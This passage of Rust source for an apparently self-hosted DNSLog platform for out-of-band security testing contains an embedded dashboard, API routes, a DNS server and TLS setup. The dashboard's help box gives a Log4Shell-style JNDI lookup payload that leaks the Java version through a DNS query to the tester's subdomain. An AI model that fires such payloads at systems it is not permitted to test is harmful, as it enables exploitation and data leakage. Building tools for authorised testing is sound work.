        <div class="card-body"><div class="tip-box">
            <strong>带外测试（OOB）：</strong>将数据嵌入子域名部分，通过 DNS 查询实现信息外传。<br>
            示例: <code>${{jndi:ldap://test.${{java:version}}.your-subdomain}}</code><br><br>
            <strong>回调接口：</strong>通过 API 程序化验证交互记录：<br>
            <code>GET /api/callback/your-subdomain?limit=10</code><br><br>
            <strong>注意：</strong>对方使用的 DNS 服务器可能存在缓存或负载均衡，导致同一次触发产生多条 DNS 记录。
        </div></div>
    </div>
</main>
<div class="footer">&copy; 2024 AdySec &mdash; DNSLog 平台 &mdash; 基于 Rust + Actix 构建</div>
<div id="toastContainer" class="toast-container"></div>
<script>
var TOKEN = '{token}';
var knownLogIds = {{}};

function showToast(msg, type) {{
    type = type || 'info';
    var c = document.getElementById('toastContainer');
    var t = document.createElement('div');
    t.className = 'toast toast-' + type;
    t.textContent = msg;
    c.appendChild(t);
    setTimeout(function() {{ t.style.animation = 'toastOut 0.3s ease-in forwards'; setTimeout(function() {{ t.remove(); }}, 300); }}, 3000);
}}
function copyText(text, label) {{
    label = label || '已复制';
    if (navigator.clipboard && navigator.clipboard.writeText) {{
        navigator.clipboard.writeText(text).then(function() {{ showToast(label, 'success'); }}).catch(function() {{ fallbackCopy(text, label); }});
    }} else {{ fallbackCopy(text, label); }}
}}
function fallbackCopy(text, label) {{
    var ta = document.createElement('textarea');
    ta.value = text; ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px';
    document.body.appendChild(ta); ta.focus(); ta.select();
    try {{ document.execCommand('copy'); showToast(label || '已复制', 'success'); }}
    catch(e) {{ showToast('复制失败', 'error'); }}
    document.body.removeChild(ta);
}}

// Event delegation
document.addEventListener('click', function(e) {{
    var t = e.target;
    if (t.closest('#tokenDisplay')) {{ copyText(TOKEN, '令牌已复制'); return; }}
    if (t.closest('#newSubBtn')) {{ createSubdomain(); return; }}
    if (t.closest('#refreshBtn')) {{ fetchLogs(); return; }}
    if (t.closest('#clearBtn')) {{ clearLogs(); return; }}
    var cb = t.closest('[data-copy]');
    if (cb) {{ copyText(cb.getAttribute('data-copy'), cb.getAttribute('data-label') || '已复制'); return; }}
    var sn = t.closest('.subdomain-name');
    if (sn) {{ copyText(sn.textContent.trim(), '子域名已复制'); return; }}
    var delBtn = t.closest('[data-delete]');
    if (delBtn) {{ deleteSubdomain(delBtn.getAttribute('data-delete')); return; }}
}});

function relativeTime(tsStr) {{
    var then = new Date(tsStr.replace(' ', 'T') + '+08:00').getTime();
    var diff = Math.floor((Date.now() - then) / 1000);
    if (diff < 0) return '刚刚';
    if (diff < 60) return diff + '秒前';
    if (diff < 3600) return Math.floor(diff / 60) + '分钟前';
    if (diff < 86400) return Math.floor(diff / 3600) + '小时前';
    return Math.floor(diff / 86400) + '天前';
}}
function recordTypeBadge(rt) {{ return '<span class="record-type type-' + (rt||'a').toLowerCase() + '">' + (rt||'A') + '</span>'; }}

function fetchSubdomains() {{
    fetch('/api/subdomains?token=' + TOKEN).then(function(r) {{ if (!r.ok) throw new Error(); return r.json(); }})
    .then(function(data) {{
        var list = document.getElementById('subdomainsList');
        var subs = data.subdomains || [];
        document.getElementById('subCount').textContent = subs.length;
        if (subs.length === 0) {{ list.innerHTML = '<div class="empty-state"><div class="empty-icon">&#x1F310;</div><div class="empty-text">暂无子域名</div><div class="empty-hint">点击「申请新子域名」创建</div></div>'; return; }}
        var h = '';
        subs.forEach(function(s) {{
            h += '<div class="subdomain-item"><span class="subdomain-name" title="点击复制">' + s + '</span><div class="subdomain-actions">' +
                '<button class="btn btn-sm" data-copy="' + s + '" data-label="子域名已复制">&#x2398; 复制</button>' +
                '<button class="btn btn-sm" data-copy="http://' + window.location.host + '/api/callback/' + s + '?limit=10" data-label="回调地址已复制">&#x26A1; 回调</button>' +
                '<button class="btn btn-sm btn-danger" data-delete="' + s + '" title="删除此子域名及其所有日志">&#x1F5D1; 删除</button>' +
                '</div></div>';
        }});
        list.innerHTML = h;
    }}).catch(function() {{ setConnectionStatus(false); }});
}}

function fetchLogs() {{
    fetch('/api/logs?token=' + TOKEN).then(function(r) {{ if (!r.ok) throw new Error(); return r.json(); }})
    .then(function(data) {{
        setConnectionStatus(true);
        var total = 0, h = '';
        data.forEach(function(item) {{
            total += item.log_count;
            h += '<div class="log-section"><div class="log-section-header"><span class="log-section-title">' + item.subdomain + '</span><span class="badge ' + (item.log_count>0?'':'badge-muted') + '">' + item.log_count + '</span></div>';
            if (item.logs.length > 0) {{
                h += '<table class="log-table"><thead><tr><th>类型</th><th>请求域名</th><th>IP 地址</th><th>归属地</th><th>时间</th></tr></thead><tbody>';
                item.logs.forEach(function(log) {{
                    var k = log.domain+'|'+log.client_ip+'|'+log.timestamp;
                    var isNew = !knownLogIds[k]; knownLogIds[k] = true;
                    h += '<tr class="'+(isNew?'log-new':'')+'"><td>'+recordTypeBadge(log.record_type)+'</td><td class="log-domain">'+log.domain+'</td><td class="log-ip">'+log.client_ip+'</td><td class="log-region">'+(log.ip_region||'-')+'</td><td class="log-time">'+relativeTime(log.timestamp)+'<span class="log-time-abs">'+log.timestamp+'</span></td></tr>';
                }});
                h += '</tbody></table>';
            }} else {{ h += '<div style="padding:20px;text-align:center;color:var(--text-muted);font-size:13px;">等待 DNS 查询...</div>'; }}
            h += '</div>';
        }});
        if (data.length === 0) h = '<div class="empty-state"><div class="empty-icon">&#x1F4ED;</div><div class="empty-text">暂无子域名</div><div class="empty-hint">请先创建子域名</div></div>';
        document.getElementById('logsContainer').innerHTML = h;
        document.getElementById('logCount').textContent = total;
    }}).catch(function() {{ setConnectionStatus(false); }});
}}

function createSubdomain() {{
    fetch('/api/newsub?token=' + TOKEN, {{method:'POST'}}).then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
    .then(function(res) {{ if (res.ok) {{ showToast('创建成功: ' + res.data.new_sub, 'success'); fetchSubdomains(); fetchLogs(); }} else {{ showToast(res.data.error||'创建失败', 'error'); }} }})
    .catch(function() {{ showToast('网络错误', 'error'); }});
}}

function deleteSubdomain(sub) {{
    if (!confirm('确定删除子域名 ' + sub + ' 及其所有日志记录？')) return;
    fetch('/api/subdomain?token=' + TOKEN + '&subdomain=' + encodeURIComponent(sub), {{method:'DELETE'}})
    .then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
    .then(function(res) {{
        if (res.ok) {{ showToast('已删除: ' + sub, 'success'); fetchSubdomains(); fetchLogs(); }}
        else {{ showToast(res.data.error||'删除失败', 'error'); }}
    }}).catch(function() {{ showToast('网络错误', 'error'); }});
}}

function clearLogs() {{
    if (!confirm('确定清空所有 DNS 日志？')) return;
    fetch('/api/clear?token=' + TOKEN, {{method:'POST'}}).then(function(r) {{ return r.json().then(function(d) {{ return {{ok:r.ok,data:d}}; }}); }})
    .then(function(res) {{ if (res.ok) {{ showToast('已清空 ' + res.data.cleared + ' 条日志', 'success'); knownLogIds = {{}}; fetchLogs(); }} else {{ showToast(res.data.error||'清空失败', 'error'); }} }})
    .catch(function() {{ showToast('网络错误', 'error'); }});
}}

function setConnectionStatus(ok) {{
    var dot = document.getElementById('statusDot');
    var text = document.getElementById('statusText');
    if (ok) {{ dot.className = 'status-dot'; text.textContent = '已连接'; }}
    else {{ dot.className = 'status-dot disconnected'; text.textContent = '连接断开'; }}
}}

fetchSubdomains(); fetchLogs();
setInterval(function() {{ fetchLogs(); fetchSubdomains(); }}, 3000);
</script>
</body>
</html>"##, token = token);

    HttpResponse::Ok().content_type("text/html; charset=utf-8").body(html)
}

// ---- HTTP -> HTTPS redirect handler ----

async fn redirect_to_https(req: HttpRequest) -> impl Responder {
    let host = req.connection_info().host().to_string();
    // Strip port from host
    let host_only = host.split(':').next().unwrap_or(&host);
    let cfg = CONFIG.get().unwrap();
    let https_port = cfg.https_port.unwrap_or(443);
    let path = req.uri().path_and_query().map(|pq| pq.as_str()).unwrap_or("/");
    let redirect_url = if https_port == 443 {
        format!("https://{}{}", host_only, path)
    } else {
        format!("https://{}:{}{}", host_only, https_port, path)
    };
    HttpResponse::MovedPermanently().append_header(("Location", redirect_url)).finish()
}

// ---- Main ----

#[tokio::main]
async fn main() -> std::io::Result<()> {
    let config = AppConfig::load();
    println!("===== DNSLog 平台配置 =====");
    println!("域名后缀: {}", config.domain);
    println!("DNS 端口: {}", config.dns_port);
    println!("HTTP 端口: {}", config.web_port);
    if let Some(p) = config.https_port { println!("HTTPS 端口: {}", p); }
    if config.tls_cert.is_some() { println!("TLS 证书: 已配置"); }
    println!("===========================");

    let _ = CONFIG.set(config.clone());

    let manager = SqliteConnectionManager::file("dnslog.db");
    let pool = Pool::new(manager).expect("Failed to create DB pool");

    {
        let conn = pool.get().expect("Failed to get DB connection");
        conn.execute_batch(r#"
            CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, token TEXT NOT NULL UNIQUE, access_ip TEXT);
            CREATE TABLE IF NOT EXISTS subdomains (id INTEGER PRIMARY KEY, user_token TEXT NOT NULL, subdomain TEXT NOT NULL, UNIQUE(user_token, subdomain));
            CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, registered_subdomain TEXT NOT NULL, requested_domain TEXT NOT NULL, client_ip TEXT NOT NULL, ip_region TEXT DEFAULT '', timestamp INTEGER NOT NULL, record_type TEXT DEFAULT 'A');
            CREATE INDEX IF NOT EXISTS idx_logs_subdomain ON logs(registered_subdomain);
            CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp);
            PRAGMA journal_mode = WAL;
        "#).expect("Failed to create tables");

        // Migrate columns
        for (col, def) in &[("record_type", "TEXT DEFAULT 'A'"), ("ip_region", "TEXT DEFAULT ''")] {
            let has: bool = conn.query_row(
                &format!("SELECT COUNT(*) FROM pragma_table_info('logs') WHERE name='{}'", col), [], |row| row.get::<_, i64>(0),
            ).map(|c| c > 0).unwrap_or(false);
            if !has { let _ = conn.execute(&format!("ALTER TABLE logs ADD COLUMN {} {}", col, def), []); }
        }
    }

    // IP lookup service
    let (ip_tx, ip_rx) = mpsc::channel::<String>(1024);
    let ip_service = IpLookupService::new(ip_rx, pool.clone());
    tokio::spawn(ip_service.run());

    // DNS server
    let pool_dns = pool.clone();
    let dns_bind = format!("0.0.0.0:{}", config.dns_port);
    let dns_server = tokio::spawn(async move {
        let socket = UdpSocket::bind(&dns_bind).await.expect("绑定 DNS 端口失败");
        let mut server = ServerFuture::new(MyDnsHandler { pool: pool_dns, ip_tx });
        server.register_socket(socket);
        server.block_until_done().await.expect("DNS server error");
    });

    // Web server (HTTP)
    let pool_web = pool.clone();
    let has_tls = config.tls_cert.is_some() && config.tls_key.is_some();

    let web_server = HttpServer::new(move || {
        let app = App::new()
            .app_data(web::Data::new(pool_web.clone()))
            .route("/api/subdomains", web::get().to(subdomains_api))
            .route("/api/newsub", web::post().to(newsub_api))
            .route("/api/subdomain", web::delete().to(delete_sub_api))
            .route("/api/logs", web::get().to(get_logs_json))
            .route("/api/clear", web::post().to(clear_logs_api))
            .route("/api/callback/{subdomain}", web::get().to(callback_api));

        if has_tls {
            // HTTP serves redirect only
            app.route("/", web::get().to(redirect_to_https))
        } else {
            // HTTP serves dashboard
            app.route("/", web::get().to(dashboard))
        }
    })
    .bind(format!("0.0.0.0:{}", config.web_port))?;

    // HTTPS server (if TLS configured)
    let https_server = if let (Some(cert_path), Some(key_path)) = (&config.tls_cert, &config.tls_key) {
        let cert_file = &mut std::io::BufReader::new(fs::File::open(cert_path).unwrap_or_else(|e| {
            eprintln!("读取证书文件失败: {} - {}", cert_path, e);
            std::process::exit(1);
        }));
        let key_file = &mut std::io::BufReader::new(fs::File::open(key_path).unwrap_or_else(|e| {
            eprintln!("读取私钥文件失败: {} - {}", key_path, e);
            std::process::exit(1);
        }));

        let certs: Vec<rustls::Certificate> = rustls_pemfile::certs(cert_file)
            .unwrap_or_else(|e| { eprintln!("解析证书失败: {}", e); std::process::exit(1); })
            .into_iter()
            .map(rustls::Certificate)
            .collect();

        let key = rustls_pemfile::pkcs8_private_keys(key_file)
            .or_else(|_| {
                // Retry with RSA format
                let key_file2 = &mut std::io::BufReader::new(fs::File::open(key_path).unwrap());
                rustls_pemfile::rsa_private_keys(key_file2)
            })
            .unwrap_or_else(|e| { eprintln!("解析私钥失败: {}", e); std::process::exit(1); })
            .into_iter()
            .map(rustls::PrivateKey)
            .next()
            .unwrap_or_else(|| { eprintln!("未找到有效的私钥"); std::process::exit(1); });

        let mut tls_config = rustls::ServerConfig::builder()
            .with_safe_defaults()
            .with_no_client_auth()
            .with_single_cert(certs, key)
            .unwrap_or_else(|e| { eprintln!("TLS 配置失败: {}", e); std::process::exit(1); });

        tls_config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];

        let pool_https = pool.clone();
        let https_port = config.https_port.unwrap_or(443);
        let server = HttpServer::new(move || {
            App::new()
                .app_data(web::Data::new(pool_https.clone()))
                .route("/", web::get().to(dashboard))
                .route("/api/subdomains", web::get().to(subdomains_api))
                .route("/api/newsub", web::post().to(newsub_api))
                .route("/api/subdomain", web::delete().to(delete_sub_api))
                .route("/api/logs", web::get().to(get_logs_json))
                .route("/api/clear", web::post().to(clear_logs_api))
                .route("/api/callback/{subdomain}", web::get().to(callback_api))
        })
        .bind_rustls(format!("0.0.0.0:{}", https_port), tls_config)?;

        println!("HTTPS 服务器监听: 0.0.0.0:{}", https_port);
        Some(server.run())
    } else {
        None
    };

    println!("HTTP 服务器监听: 0.0.0.0:{}", config.web_port);
    println!("域名后缀: {}", domain_suffix());

    tokio::select! {
        _ = tokio::signal::ctrl_c() => { println!("收到 Ctrl+C 信号，正在优雅退出..."); },
        res = web_server.run() => { res?; },
    }

    if let Some(srv) = https_server {
        srv.await?;
    }
    dns_server.abort();
    Ok(())
}
